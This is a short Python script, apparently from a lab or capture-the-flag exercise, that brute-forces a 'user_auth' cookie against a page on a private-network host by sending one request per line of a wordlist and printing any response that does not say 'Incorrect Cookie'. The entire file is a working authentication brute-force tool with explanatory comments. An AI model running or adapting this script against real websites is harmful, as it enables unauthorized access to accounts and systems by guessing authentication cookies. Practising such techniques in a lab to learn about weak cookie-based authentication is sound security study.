import requests
lines = []

with open("raft.txt","r") as raft:
    lines = raft.readlines()

for i in lines:
    mycookie = {'user_auth':i.replace("\n","")}
    #Create our cookie as a dictionary. i = current line in wordlist
    response = requests.get('http://172.25.0.29/page1.php', cookies=mycookie)
    #Fetch the page with the cookie set and return the response
    currentPageText = response.text
    #Save the current page text to a variable
    if "Incorrect Cookie" not in currentPageText:
        print(response.text)
    #Check to see if the text above is not there. If it's not, show us what was actually returned.
    
    
    
    
    
    
    
#print(i.replace("\n",""))
#The replace("\n","") removes line breaks from the output